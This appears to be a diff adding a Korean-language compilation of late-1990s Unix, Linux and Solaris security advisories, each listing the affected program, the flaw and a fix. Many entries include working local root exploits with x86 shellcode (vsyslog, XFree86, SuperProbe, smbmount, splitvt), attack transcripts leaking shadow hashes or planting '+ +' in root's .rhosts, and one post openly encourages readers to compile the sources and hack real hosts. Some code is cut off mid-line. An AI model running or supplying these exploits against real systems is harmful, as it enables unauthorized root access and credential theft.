@@ -1,0 +1,1772 @@
+﻿
+ 제  목: [보안] 리눅스 garbage
+명령
+
+        net/unix/garbage.c
+
+시스템
+
+        커널 2.0.x
+
+문제점
+
+        NR_FILE (or  /proc/sys/kernel/file-max)을 1024 보다 더 크게 하므로써
+        문제가 발생할 수 있다.
+
+        그에 대한 소스는 공개하지 않겠다.
+        왜냐.. 아직 해결 방법이 없는 듯하다.
+        2.0.33버젼을 깔아보아도 역시 버그가 생긴다.
+
+해결책
+
+        궁여지책으로 각유저의 프로세스를 6개 미만으로 할당 시키는 것이다.
+
+---------------------------
+
+ 제  목: [보안] 리눅스 vsyslog()
+명령
+
+        vsyslog() overflow
+
+시스템
+
+        Linux with libc 5.4.23 and RH 5.3.12-18
+
+문제점
+
+        이 문제점은 libc 5.4.38에서 고쳐졌다.
+        vsyslog()함수를 버퍼 오버 플로우 시켜 이를 이용한다.
+
+        $ id
+        uid=100(guest)
+        $ ln -s /bin/su hahaha
+        $ export PATH=.:$PATH
+        $ hahaha
+        Password:
+        # id
+        uid=0(root) gid=0(root)
+        # tail -1 /var/log/messages
+        Jan  6 00:37:36 guest hahaha: root on /dev/ttyp2
+
+        이런 식으로 된다. 원래 su 를 해서 루트로 되었을때는
+        Jan  6 00:37:36 guest su: root on /dev/ttyp2
+        로 되어야 한다.
+
+        여기에는 어떤 보안상 헛점이 없다. 하지만 이것은 openlog()을 위한
+        argv[0]을 사용하는데 어떤 가능성이 보인다.
+
+        이것을 더 자세하게 보이면..
+        쉘 코드에 '/' 를 쓸수 없는 관계로.. _bin_sh 라고 쉘코드에 명시되어
+        있다. 그리하여 /bin/sh 를 _bin_sh 로 복사해두어라.
+        그리고 현재의 PATH 에 '.'를 추가 시켜라.
+        그리고나서 이 프로그램을 돌려야 한다.
+            /*
+     vsyslog()/openlog() exploit by BiT - 8/8 1997
+     Greets to: doodle, skaut, melon, kweiheri etc.
+     */
+
+    #include 
+    #include 
+
+    unsigned long get_esp(void)
+    {
+      __asm__("movl %esp, %eax");
+    }
+
+    void main(int argc, char **argv)
+    {
+      unsigned char shell[] =
+      "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
+      "\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
+      "\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff_bin_sh";
+      char *buf,*p;
+      unsigned long *adr;
+      int i;
+      if((p=buf=malloc(2028+28)) == NULL)
+        exit(-1);
+      memset(p,0x90,2028);
+      p+=2028-strlen(shell);
+      for(i=0;i
+
+    int main()
+    {
+            char ident[4096];
+
+            memset(ident, 'x', sizeof(ident));
+            ident[sizeof(ident) - 1] = 0;
+
+            openlog(ident, 0, LOG_AUTHPRIV);
+            syslog(LOG_NOTICE, "message");
+
+            return 0;
+    }
+
+        이를 고치려면 이곳에서 패치하라
+        http://www.false.com/security/linux-stack/
+---------------------------
+
+ 제  목: [보안] 리눅스&유닉스 X서버R5,R6
+명령
+        X서버 X11R6 , X11R5
+
+시스템
+
+        X11R6 이 깔린 시스템
+
+문제점
+
+        X11R6을 시스템에 인스톨시 setuid 나 setgid 가 붙는다.
+        XF86_드라이브  이런것들은 setuid 가 root 이다.
+        그러나 로컬유저가 버퍼 오버런을 이용해서 특별한 권한을 가지게 될수
+        있다.
+        엑스 서버가 시윳풔  동안에 ResetHosts() 함수를 호출한다.
+        그럴때 display 를
+X :00000000000000000000000000000000000000000000000000000000000000000\
+00000000000000000000000000000000000000000000000000000000000000000000\
+00000000000000000000000000000000000000000000000000000000000000000000\
+00000000000000000000000000000000000000000000000000000000000000000000\
+00000000000000000000000000000000000000000000000000000000000000000000\
+00000000000000000000000000000000000000000000000000000000000000000000\
+00000000000000000000000000000000000000000000000000000000000000000009
+
+        이런 식으로 설정할때... 버퍼 오버 플로우를 일으킬수 있는 잠재력을
+        가지고 있다.
+
+해결책
+
+        1) 엑스 서버를 인스톨 한후 모든 setuid 나 setgid 를 없애라.
+        2) xdm을 쓰거나 안전한 setuid 와퍼로 X서버를 시작해라.
+
+        이것은 버그에 따른 와퍼이다.
+        설치 법은 영어로 간단하게 써있으므로 잘 보면서 설치해라.
+
+    /*
+        Description: X server wrapper
+
+        Instalation steps:
+         0. Become root (su -)
+         1. Modify  the X_Server  program variable  according to  your
+            taste (i.e. the X server true path, not the link to it!)
+         2. Compile this program as
+             cc Xserver.c -O4 -o Xserver
+         3. Copy  the resulting  binary to  /usr/X11/bin, or  whatever
+            path you may have
+         4. chmod 04711 Xserver
+         5. Suppose your X server is called "XF86_S3"; issue a command
+            chmod 0711 XF86_S3
+         6. Remove the old link for X (e.g X -> /usr/X11/bin/XF86_S3)
+         7. Make a new link
+             ln -s /usr/X11/bin/Xserver /usr/X11/bin/X
+
+        Copyright policy: the GNU Public License.
+
+        This program is intended as a temporary patch for an  existing
+        X  server;  it  is  provided  "as  is",  the  author  is   not
+        responsible for  any direct/indirect  damage(s) caused  by its
+        use.
+    */
+
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+
+    /*
+       This is intended for debugging porposes only.
+       Do NOT define this for a normal usage!!
+    */
+    #define _DEBUG
+    #define SIZE 1024
+
+    /* guaranteed filled with NULLs by UNIX */
+    char* args[SIZE];
+    int argsCount = 0;
+
+    char* sccsID =
+      "@(#) X wrapper 1.0 Copyright (C) 1998 by Vadimir COTFAS (ulianov@mecanica
+.math.unibuc.ro), Jan 14th 1998";
+    char *X_Server = "/usr/X11/bin/XF86_S3";
+
+    int main(int argc, char* argv[])
+    {
+       int i;
+       uid_t uid, euid;
+       struct passwd* pass;
+
+       openlog("Xserver",           LOG_CONS|LOG_NDELAY|LOG_PERROR|LOG_PID, 
+LOG_AUTHPRIV);
+
+       uid = getuid(); euid = geteuid();
+
+       if(!((uid==0) || (euid==0))){
+          fprintf(stderr,"Xserver: this program must be run as (setuid) root\n")
+;
+          exit(1);
+       }
+
+       pass = getpwuid(uid);
+
+       for(i=0; i 2)){
+             syslog(LOG_NOTICE, "potential buff ovrflw at arg #%d user %s",
+                     i, pass->pw_name);
+             continue;
+          }
+          if(strstr(argv[i], "-config")){
+             syslog(LOG_NOTICE, "security vulnerability at arg #%d user %s \n",
+                     i, pass->pw_name);
+             i++;
+             continue;
+          }
+          if(argsCount >= SIZE){
+             syslog(LOG_NOTICE,   "too   many   args    (>1024)   user   %s   \n", 
+pass->pw_nam
+e);
+             exit(1);
+          }
+          args[argsCount++] = argv[i];
+       }
+       args[argsCount] = NULL; /* just to be sure */
+
+    #ifdef DEBUG
+       for(i=0; i
+        #include 
+        int _init() {
+             char *sh[2];
+        sh[0] = "/bin/sh";
+        sh[1] = NULL;
+        setuid(0);
+        setgid(0);
+        seteuid(0);
+        execve(sh[0], sh, NULL);
+        }
+
+해결책
+
+        chmod u-s quake2 게임은 혼자하는 거니깐 setuid 를 없애는 것이 낫다.
+        반드시 해야 할 상황이라면
+        http://synergy.caltech.edu/~ggi/ 에 가면 해결책이 있다.
+
+---------------------------
+
+ 제  목: [보안] 리눅스 imapd (2)
+명령
+
+        imapd , ipop3d
+
+시스템
+
+        슬랙 3.3(imapd 만 해당), 슬랙 3.4
+
+문제점
+
+        초기 슬랙웨어에서는 이 버그가 허용되지 않았다.
+        알수 없는 유저가 들어오려할때 imapd 와 ipop3d 데몬은
+        코어 덤프를 일으킨다.
+        그런데 그 파일에 쉐도우 파일이 첨가되어있다.
+        그 이유는 두개의 데몬들이 유저를 로그인시키려면 쉐도우 파일을
+        읽어들이기 때문이다. 이때 코어 덤프가 생겨서 / 디렉토리에
+        core 파일이 생긴다.
+
+        [root@koek] /# telnet host 110
+        Trying 10.10.13.1...
+        Connected to host.com
+        Escape character is '^]'.
+@
+        +OK   some    host   POP3    3.3(20)   w/IMAP2   client    (Comments   to 
+MRC@CAC.Washingto
+n.EDU) at Sun, 1 Feb 1998 23:45:06 +0100 (CET)
+        user root
+        +OK User name accepted, password please
+        pass linux
+        [this is not the correct password]
+        -ERR Bad login
+        user john
+        [no user named john]
+        +OK User name accepted, password please
+        pass doe
+        Connection closed by foreign host.
+         / 디렉토리에 간후에
+        [root@zopie] /# strings core | grep -A3 root
+        root
+        [crypted pw here]
+
+        10244
+        Sun Feb  1 23:45:15 1998
+        --
+        root:[crypted pw here]:10244:0:::::
+        halt:*:9797:0:::::
+        operator:*:9797:0:::::
+        shutdown:*:9797:0:::::
+        [looks like /etc/shadow]
+        --
+        root:[crypted pw here]:10244:0:::::
+        john
+        host.com
+        PASS
+
+
+
+해결책
+
+        우선은 막아두며 패치 버젼이 나올때까지 기다린다.
+
+---------------------------
+
+ 제  목: [보안] 리눅스 xServer (위험)
+
+* 이 버그는 상당히 위험한 버그이므로 절대로 악용하지 말길
+  바란다. 부탁이다.
+
+명령
+
+        XServer
+
+시스템
+
+        인텔 x86의 엑스 서버
+
+문제점
+
+        엑스 서버의 문제점은 과거에 부터 문제점이 제기되어왔다.
+        디스 플레이를 xx로 채워서 세그먼트 폴트를 나오게 한 것은
+        버퍼 오버 플로우의 가능성을 보여주었다.
+        다음과 같은 소스로 일반 사용자가 루트를 얻을 수 있다.
+
+
+/* Try 2 3 4 5 for OFFSET */
+#define OFFSET 2
+
+#include 
+#include 
+#include 
+
+#define LENCODE ( sizeof( Code ) )
+char Code[] =
+    "\xeb\x40\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0"
+    "\x3f\x89\xc2\x31\xdb\xb3\x0a\x31\xc9\xcd\x80\x89\xd0\x43\x41"
+    "\xcd\x80\x89\xd0\x43\x41\xcd\x80\x31\xc0\x89\xc3\xb0\x17\xcd"
+    "\x80\x31\xc0\xb0\x2e\xcd\x80\x31\xc0\xb0\x0b\x89\xf3\x8d\x4e"
+    "\x08\x8d\x56\x0c\xcd\x80\xe8\xbb\xff\xff\xff/bin/sh";
+
+char Display[ 0x4001 + OFFSET ] = ":99999", *ptr = Display + OFFSET + 1;
+char *args[] = { "X", "-nolock", Display, NULL };
+
+main() {
+  printf("pHEAR -   XFree86 exploit\nby  mAChnHEaD \n\nYou 
+may
+get a root prompt now. If you don't, try different values for OFFSET.\n\n");
+  dup2( 0, 10 ); dup2( 1, 11 ); dup2( 2, 12 );
+  __asm__("movl %%esp,(%0)\n\tsubl %1,(%0)"::"b"(ptr),"n"(LENCODE+0x2000));
+  memcpy( ptr + 4, ptr, 0x3fc );
+  memset( ptr + 0x400, 0x90, 0x3c00 - LENCODE );
+  memcpy( ptr + 0x4000 - LENCODE, Code, LENCODE );
+  execve( "/usr/X11R6/bin/X", args, args + 3 );
+  perror( "execve" );
+}
+
+
+해결책
+
+        우선은 셋유저 아이디를 없애라..
+        또한 /usr/X11R6 디렉토리의 퍼미션을 750 으로 해두고
+        그룹을 정해서 필요한 사람만 쓰게 해라.
+
+---------------------------
+
+ 제  목: [보안] 리눅스 cron
+명령
+
+        vixie cron
+
+시스템
+
+        vixie cron(버젼 3.0.1-20이하)이 설치된 리눅스,BSD
+
+문제점
+
+        /usr/bin/crontab 은 셋유저 아이디가 루트로 붙어있다.
+        그런데 매시간 유저에 의해 불려지게 되면 루트 소유의 임시 탬프 파일이
+        생긴다.
+        이 파일은 /var/spool/cron 디렉토리 이다.
+        그런데 이때 만들어지는 임시 파일들은 자신에게 할당된 쿼터에 영향을
+        받지 않는 경향이 있다.
+        이에 쿼터에 상관없이 디스크 full 을 만들 수 있다.
+
+        어떤 일련의 과정을 하게 되면 이렇게 된다.
+        [root@genome /]# ls -l /var/spool/cron
+        total 25106
+        -rw-------   1 root     root          769 Nov 27 20:21 root
+        -rw-------   1 root     lcamtuf   5120000 Feb  5 15:01 tmp.453
+        -rw-------   1 root     lcamtuf   5120000 Feb  5 15:02 tmp.468
+        -rw-------   1 root     lcamtuf   5120000 Feb  5 15:03 tmp.469
+        -rw-------   1 root     lcamtuf   5120000 Feb  5 15:03 tmp.482
+        -rw-------   1 root     lcamtuf   5120000 Feb  5 15:03 tmp.483
+
+        이렇게 되어 나중엔 파일이 꽉차게 된다.
+
+해결책
+
+        아직 나와있는 뚜렷한 해결책은 없다..
+        단지 suid 를 없애는 수 밖에..
+        chmod 700 /usr/bin/crontab  를 임시로 해주면 된다.
+
+---------------------------
+
+ 제  목: [보안] SUNOS tmpfs
+명령
+
+        tmpfs
+
+시스템
+
+        SunOS 4.1.4
+
+문제점
+
+        야마모리 타케노리씨가 발견한 것이다. tmpfs 에 문제가 있다.
+        이 버그로 인해 커널 패닉을 일으키면서 시스템이 죽는다.
+        스크린이나 기타 멀티로 두개로 접속을 한다.
+        아니면 스크린이라는 기능을 이용해서 화면을 두개로 나누던지..
+
+        $ /tmp
+        $ mkdir a
+        $ cd a
+        $ vi b (b파일을 열고서 아무글이나 쓴다. 그상태에서...)
+        [ switch screen ] <=(스크린의 경우 다른 스크린으로 바꾸어라.& 멀티)
+        $ rm -r /tmp/a
+        [ switch screen ] <=(다시 원래상태로 간다음..저장해봐라....)
+        (save the file using :w in vi)
+        커널 패닉을 일으키면서 시스템이 죽는다.
+해결책
+
+        패치 번호 103314-01 을 선사이트에서 찾아서 패치하라
+
+---------------------------
+
+ 제  목: [보안] 솔라리스 volrmmount
+명령
+
+        volrmmount
+
+시스템
+
+        SunOS 5.6 (sparc and x86)
+
+문제점
+
+        volrmmount프로그램은 setuid 가 걸린 프로그램으로써 모든유저들에게
+        매체(media)를 열거나 넣을수 있게 허락해준다.
+        그런데 이 프로그램을 공격할 수가 있다. 그것에 의해 일반 사용자들이
+        그 시스템의 어떤 파일이든지 볼수 있고, 루트의 권한을 획득할수도 있다.
+
+해결책
+
+        다음의 패치 버젼을 가져오면 된다.
+
+        OS version          Patch ID
+        __________          ________
+        SunOS 5.6           105407-01
+        SunOS 5.6_x86       105408-01
+
+---------------------------
+
+ 제  목: [보안] 솔라리스 dtappgather (따끈~)
+명령
+
+        /usr/dt/bin/dtappgather
+
+시스템
+
+        CDE 버젼 1.0.2 가 깔린  솔라리스 2.5 2.5.1
+
+문제점
+
+        /usr/dt/bin/dtappgather 프로그램은 setuid 가 root 로 걸려있는
+        프로그램이다.
+        그런데 솔라리스 2.5 2.5.1 에서는 /usr/dt/bin/dtappgather 디렉토리가
+        777 모드로 되어있어서 누구든지 쓰고 읽을 수가 있다.
+        ( 솔라리스 2.6에서는 755 모드로 되어있다. :-) )
+        generic-display-0 라는 파일을 미리 만들어 놓고 setuid 가 걸린
+        /usr/dt/bin/dtappgather 을 실행시키면 파일에 변화가 온다.
+        이를 이용하면 쉽게 시스템의 모든 파일을 읽고 쓰고 할 수가 있게된다.
+        간단하면서도 무서운 버그이다.
+
+
+해결책
+
+
+        아직 버그가 나온지 하루밖에 안지났다.
+        이에.. 버그 패치는 나오지 않았다. 조만간 나올것이다.
+        우선 이렇게 막아두어라.
+        chmod -s /usr/dt/bin/dtappgather
+
+---------------------------
+
+ 제  목: [보안] info2www 보안
+명령
+
+        info2www
+
+시스템
+
+        info2www 1.1(이하) 을 깔은 시스템
+
+문제점
+
+        다음과 같은 형태로 명령을 내릴수 있다.
+
+        $ REQUEST_METHOD=GET ./info2www '(../../../../../../../bin/mail user_nam
+e  4.2 or 5.0 으로
+        환경 설정에서 TMPDIR = /root/tmp 과 같은 형식으로 루트만
+        들어갈 수 있는 디렉토리로 설정을 한다.
+
+        S.u.S.E 리눅스의 경우
+        버젼 5.0 은
+        ftp://ftp.suse.com/pub/suse_update/S.u.S.E.-5.0/a1/aaa_base.rpm
+        ftp://ftp.suse.com/pub/suse_update/S.u.S.E.-5.0/ap1/makewhat.rpm
+
+        버젼 4.4.1 ( 이하 버젼 ) 의 경우
+        ftp://ftp.suse.com/pub/suse_update/S.u.S.E.-4.4.1/a1/aaa_base.tgz
+        ftp://ftp.suse.com/pub/suse_update/S.u.S.E.-4.4.1/ap1/makewhat.tgz
+
+        기타 리눅스 유닉스등은 각각 ftp 에서 업그레이or 패치 버젼을 받아라
+
+---------------------------
+
+ 제  목: [보안] X11Amp 보안
+명령
+
+        X11Amp
+
+시스템
+
+        X11Amp 0.65 를 쓰는 시스템
+
+문제점
+
+        플레이어 리스트 파일이 ~/.X11amp 디렉토리에 생기는데 그  파일이
+        루트 권한이다.
+        이를 이용해서 쉐도우와 심볼릭 링크 시킨다.
+
+        mkdir ~/.X11amp
+        ln -s /etc/shadow ~/.X11amp/ek1
+
+        그 후에 일련의 과정을 거치면 헛점이 생긴다.
+
+해결책
+
+        http://www.x11amp.ml.org 에 가서 패치버젼을 받는다.
+
+---------------------------
+
+ 제  목: [보안] 리눅스 퀘이크 2
+명령
+
+        퀘이크 2 (3.13 이하 버젼)
+
+시스템
+
+        리눅스
+
+문제점
+
+        퀘이크를 실행시키면(어떤 유저든지) config.cfg파일을 읽어내려고 한다.
+        그러나 이를 이용해서 config.cfg파일을 쉐도우와 링크 시켜서
+        헛점이 생기게 만들수 있다.
+
+        nop@chrome:~> id
+        uid=501(nop) gid=100(users) groups=100(users)
+        nop@chrome:~> mkdir baseq2
+        nop@chrome:~> ln -s /etc/shadow baseq2/config.cfg
+        nop@chrome:~> ls -l /usr/games/quake/quake2
+        -rws--x--x   1 root     root       303444 Feb 24 19:07    /usr/games/qua
+ke/quake2
+        nop@chrome:~> /usr/games/quake/quake2
+        couldn't exec default.cfg
+        execing config.cfg
+        Unknown command "root:[snip]:10137:0:99999:7:::"
+        Unknown command "bin:*:9977:0:99999:7:::"
+        Unknown command "daemon:*:9977:0:99999:7:::"
+        Unknown command "adm:*:9977:0:99999:7:::"
+        Unknown command "lp:*:9977:0:99999:7:::"
+        [etc]
+
+해결책
+
+        chmod -s /usr/games/quake/quake2
+
+---------------------------
+
+ 제  목: [참고] 여기 의 모든 리포트들은 루트얻는
+루트 얻는 정보가 될수가 있고, 그것을 막을 수 있는 정보가 있습니다.
+보통 해킹을 한다는 것은 여기란의 글들을 보고 그에 맞춰서 행동을
+해서 root 를 획득하는 것으로 대다수 사람들이 생각합니다.
+여기란의 글들을 자세히 보고서 한번 해킹을 해보세요.
+직접.. 리눅스 & 솔라리스 호스트에서 시도해보세요.
+
+조금만 신경쓰면 해킹하는 것은 식은죽 먹기 보다 더 쉬워요.
+해킹은 보통 10분안에 성공과 실패를 가름하게 되죠..
+10분안에 모든 해킹을 시도 할 수가 있죠.
+바로 이 란의 리포트들에 의해서
+반드시 한번은 읽어보시고 갈무리 하세요
+각 리포트 마다 해킹 소스가 있으니까요.
+그 해킹 소스를 컴파일 해서 돌리면 보통 루트를 획득
+할 수 있습니다.
+각 경우의 시스템에 맞춰서 소스를 얻어야 겠죠?
+솔라리스 2.5.1의 서버를 해킹하려면 그에 관련된 소스만 써봐야겠죠.
+리눅스라면 리눅스의 맞는 소스를
+
+
+ 제  목: [보안] 리눅스 pkgtool
+명령
+
+        pkgtool
+
+시스템
+
+        Linux Slackware 3.0 or earlier
+
+문제점
+
+        pkgtool을 쓸때 /tmp/PKGTOOL.REMOVED라는 파일이 새긴다. 이를 이용해
+        링크시켜서 .rhosts를 만든다.
+
+
+        hamors (2 20:57) litterbox:/tmp> ls -al | grep PKG
+        - - -rw-rw-rw-   1 root     root        16584 Aug 26 18:07
+PKGTOOL.REMOVED.backup
+
+        hamors (3 21:00) litterbox:/tmp> ln -s ~root/.rhosts PKGTOOL.REMOVED
+
+        hamors (4 20:58) litterbox:/tmp> cat PKGTOOL.REMOVED
+        cat: PKGTOOL.REMOVED: No such file or directory
+
+        God (17 20:59) litterbox:~# pkgtool
+        root now uses PKGTOOL to delete a package
+
+        hamors (5 DING!) litterbox:/tmp> head PKGTOOL.REMOVED
+        Removing package tcl:
+        Removing files:
+        ...
+
+        hamors (6 21:00) litterbox:/tmp> echo "+ +" > PKGTOOL.REMOVED
+
+        hamors (7 21:00) litterbox:/tmp> cat ~root/.rhosts
+        + +
+
+해결책
+
+        pkgtool은 루트만이 쓸수 있도록 700 모드로 해놓는다.
+
+---------------------------
+
+ 제  목: [보안] 리눅스 SuperProbe
+명령
+
+        /usr/X11/bin/SuperProbe
+
+시스템
+
+        Linux Slackware 3.1
+
+문제점
+
+        버퍼 오버플로우를 일으킬 수 있다.
+
+        --- probe.c ---
+
+        #include 
+        #include 
+        #include 
+
+        char *shellcode =
+
+"\x31\xc0\xb0\x31\xcd\x80\x93\x31\xc0\xb0\x17\xcd\x80\x68\x59\x58\xff\xe1"
+
+"\xff\xd4\x31\xc0\x8d\x51\x04\x89\xcf\x89\x02\xb0\x2e\x40\xfc\xae\x75\xfd"
+
+"\x89\x39\x89\xfb\x40\xae\x75\xfd\x88\x67\xff\xb0\x0b\xcd\x80\x31\xc0\x40"
+          "\x31\xdb\xcd\x80/"
+          "/bin/sh"
+          "0";
+
+        char *get_sp() {
+          asm("movl %esp,%eax");
+        }
+
+          #define bufsize 8192
+          #define alignment 0
+          char buffer[bufsize];
+
+        main() {
+          int i;
+
+          for (i = 0; i < bufsize / 2; i += 4)
+          *(char **)&buffer[i] = get_sp() - 2048;
+          memset(&buffer[bufsize / 2], 0x90, bufsize / 2);
+          strcpy(&buffer[bufsize - 256], shellcode);
+          setenv("SHELLCODE", buffer, 1);
+
+          memset(buffer, 'x', 72);
+          *(char **)&buffer[72] = get_sp() - 6144 - alignment;
+          buffer[76] = 0;
+
+          execl("/usr/X11/bin/SuperProbe", "SuperProbe", "-nopr", buffer,
+NULL);
+        }
+
+
+해결책
+
+        어짜피 이 프로그램은 루트만 쓸것이므로 700 모드로 해둔다.
+
+---------------------------
+
+ 제  목: [보안] 리눅스& aix rlogin
+명령
+
+        rlogin
+
+시스템
+
+        Linux Slackware 3.1, RedHat 2.0, 2.1
+
+문제점
+
+        이 프로그램은 과거 AIX 3.2 에서 발견되었던 아주 심각한 버그로 아래
+        단 한줄로 밖에서 루트로 로그인 할 수 있다.
+        -f 옵션을 쓰면 아이디 체크를 제대로 하지 못하는 버그이다.
+
+        % rlogin haxored.net -l -froot
+        #
+
+해결책
+
+        어서 업그레이드 하라.
+
+---------------------------
+
+ 제  목: [보안] 리눅스 rxvt
+명령
+
+        rxvt
+
+시스템
+
+        Linux Slackware 3.0, RedHat 2.1
+        others with rxvt suid root (and compiled with PRINT_PIPE)
+
+문제점
+
+        X 서버를 위한 터미널 에뮬레이터인 rxvt는 버그가 있다.
+        아래의 방법으로 쉽게 루트를 얻는다.
+
+    1.  Set DISPLAY environment  variable if necessary so you  can use
+        x clients.
+
+    2.  In user shell:
+
+        $ echo 'cp /bin/sh /tmp/rxsh;chmod 4755 /tmp/rxsh' > /tmp/rxbug
+        $ chmod +x /tmp/rxbug
+        $ rxvt -print-pipe /tmp/rxbug
+
+    3.  In rxvt xclient:
+
+        $ cat
+          ESC[5i
+          ESC[4i
+
+        (The client will close at this point with a broken pipe)
+
+    4.  $ /tmp/rxsh
+        # whoami
+        root
+        #
+
+해결
+
+        chmod -s /usr/X11R6/bin/rxvt
+
+---------------------------
+
+제  목: [보안] 리눅스 smbmount
+명령
+
+        smbmount
+
+시스템
+
+        Linux
+
+문제점
+
+        삼바-2.0.1 버젼(?)에서 비롯된 것으로 버퍼 오버플로우를 일으킬수 있다.
+
+
+    #include 
+    #include 
+
+    #define DEFAULT_OFFSET                 -202
+    #define DEFAULT_BUFFER_SIZE             211
+    #define DEFAULT_ALIGNMENT                 2
+    #define NOP                            0x90
+
+    /* This shell code is designed to survive being filtered by toupper()
+*/
+
+    char shellcode[] =
+
+"\xeb\x20\x5e\x8d\x46\x05\x80\x08\x20\x8d\x46\x27\x80\x08\x20\x40"
+
+"\x80\x08\x20\x40\x80\x08\x20\x40\x40\x80\x08\x20\x40\x80\x08\x20"
+            "\xeb\x05\xe8\xdb\xff\xff\xff"
+
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+
+"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+            "\x80\xe8\xdc\xff\xff\xff/tmp/sh";
+
+
+    unsigned long get_sp(void) {
+       __asm__("movl %esp,%eax");
+    }
+
+    void main(int argc, char *argv[]) {
+      char *buff, *ptr;
+      long *addr_ptr, addr;
+      int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+      int alignment=DEFAULT_ALIGNMENT;
+      int i;
+
+      if (argc > 1) bsize  = atoi(argv[1]);
+      if (argc > 2) offset = atoi(argv[2]);
+      if (argc > 3) alignment = atoi(argv[3]);
+      printf("bsize=%d offset=%d alignment=%d\n",bsize,offset,alignment);
+
+      if (!(buff = malloc(bsize))) {
+
+        printf("Can't allocate memory.\n");
+        exit(0);
+      }
+
+      addr = get_sp() - offset;
+      fprintf(stderr,"Using address: 0x%x\n", addr);
+      ptr = buff;
+      addr_ptr = (long *) (ptr+alignment);
+      for (i = 0; i < bsize-alignment; i+=4)
+        *(addr_ptr++) = addr;
+
+      for (i = 0; i < bsize/2; i++)
+        buff[i] = NOP;
+
+      ptr = buff + (128 - strlen(shellcode));
+      for (i = 0; i < strlen(shellcode); i++)
+
+        *(ptr++) = shellcode[i];
+
+      buff[bsize - 1] = '\0';
+
+      setenv("USER",buff,1);
+      execl("/sbin/smbmount","smbmount","//a/a","./a","-Q",0);
+    }
+
+문제점
+
+        버그 픽스된 smbfs-2.0.2 를 쓰면 해결이 되며 밑의 ftp에서 찾을수 있다.
+
+        ftp://ftp.suse.com/pub/suse_update/S.u.S.E.-4.4.1/n1/samba
+
+        ftp://ftp.gwdg.de/pub/linux/misc/smbfs
+
+        http://www.sernet.de/vl/linux-lan/
+
+---------------------------
+
+ 제  목: [보안] 리눅스 perl 5.001
+명령
+
+        perl (suidperl/sperl5.001)
+
+시스템
+
+        Linux Slackware 3.0
+
+문제점
+
+        suid가 root인 펄 프로그램이 로컬유저로 하여금 루트를 얻게 해준다.
+        아래와 같은 간단한 프로그램으로 루트로 엑세스 해준다.
+
+        #!/usr/bin/perl -U
+        # root access on any SUID perl infected system......
+        # chmod 4755 this script and run it....
+
+        $ENV{PATH}="/bin:/usr/bin";
+        $>=0;$<=0;
+        exec("/bin/bash");
+
+해결책
+
+        700모드로 해둔다.
+
+---------------------------
+
+ 제  목: [보안] 리눅스 퀘이크 게임
+명령
+
+        squake
+
+시스템
+
+        Linux
+
+문제점
+
+        초창기 인스톨 될때 squake라는 프로그램은 4755의 모드로 되어있다.
+        그런데 이프로그램이 조작을 하면 segfault를 일으켜서 루트를 얻을
+        수 있다.
+
+        squake -game aaaaaaaaaaaaaa <=(152개의 문자가 들어가면 된다.)
+
+
+해결책
+
+         chmod 700 squake
+
+---------------------------
+
+ 제  목: [보안] 리눅스 splitvt
+명령
+
+        splitvt(1)
+
+시스템
+
+        Linux 2-3.X
+
+문제점
+
+        로컬 유저가 루트로 로그인 할 수 잇다.
+        오버 플로우를 일으킬 수가 있다.
+
+    crimson~$ cc -o sp sp.c
+    crimson~$ sp
+    bash$ sp
+    bash$ splitvt
+    bash# whoami
+    root
+
+sp.c ---------
+
+
+long get_esp(void)
+{
+__asm__("movl %esp,%eax\n");
+}
+main()
+{
+  char eggplant[2048];
+  int a;
+  char *egg;
+  long *egg2;
+  char realegg[] =
+"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
+"\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
+"\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";
+
+  char *eggie = realegg;
+
+  egg = eggplant;
+
+  *(egg++) = 'H';
+  *(egg++) = 'O';
+  *(egg++) = 'M';
+  *(egg++) = 'E';
+  *(egg++) = '=';
+
+  egg2 = (long *)egg;
+
+  for (a=0;a<(256+8)/4;a++) *(egg2++) = get_esp() + 0x3d0 + 0x30;
+
+  egg=(char *)egg2;
+
+  for (a=0;a<0x40;a++) *(egg++) = 0x90;
+
+  while (*eggie)
+    *(egg++) = *(eggie++);
+  *egg = 0; /* terminate eggplant! */
+
+  putenv(eggplant);
+
+  system("/bin/bash");
+}
+해결책
+
+  700 모드로 하는게 상책이다.
+  아니면 각자의 리눅스 페이지로 가서 업그래이트를 한다.
+
+---------------------------
+
+ 제  목: [보안] 리눅스 admin
+
+명령
+
+    admin
+
+시스템
+
+    Linux systems running admin-v1.2 and older ones (others?)
+
+문제점
+
+    admin-v1.2 패키지에 있는 시스템 어드민 툴에서 버그가 발견되었다.
+    로컬 유저가 /tmp디렉토리의 어드민 툴 관련 파일을 지우고 이를 링크
+    시켜서 루트의 권한으로 어디든 파일을 만들 수 있다.
+    /tmp/name.$$ 라는 파일의 형태로 존재한다.
+    이 파일을 /etc/passwd에 연결시켜서 passwd파일을 고칠 수도 있고
+    /.rhosts 를 만들 수도 있다.
+
+해결책
+
+         700 모드로 바꿔라
+
+---------------------------
+
+ 제  목: [보안] 리눅스 svgalib/zgv
+명령
+
+        svgalib/zgv
+
+시스템
+
+        Redhat Linux 3.0.3 - 4.1
+        어떤 리눅스든지 zgv에 setuid root 인것
+
+문제점
+
+        스택 오버롸이트를 일으켜서 버퍼 오버런 공격을 시도하면 루트를
+        얻을 수 있다.
+        zgv-2.7 은 GIF나 JPG를 볼수 있는 뷰어 이다.
+
+    /*
+     *
+     * zgv exploit coded by BeastMaster V on June 20, 1997
+     *
+     * USAGE:
+     *   For some strage reason, the filename length of this
+     *   particular exploit must me one character long, otherwise you
+     *   will be dropped into a normal unpriviledged shell. Go Figure....
+     *   Try increasing the offest by increments of 10 if you get
+     *   an Illegal Instruction or Segmentation Fault.
+     *
+     *   $ cp zgv_exploit.c n.c
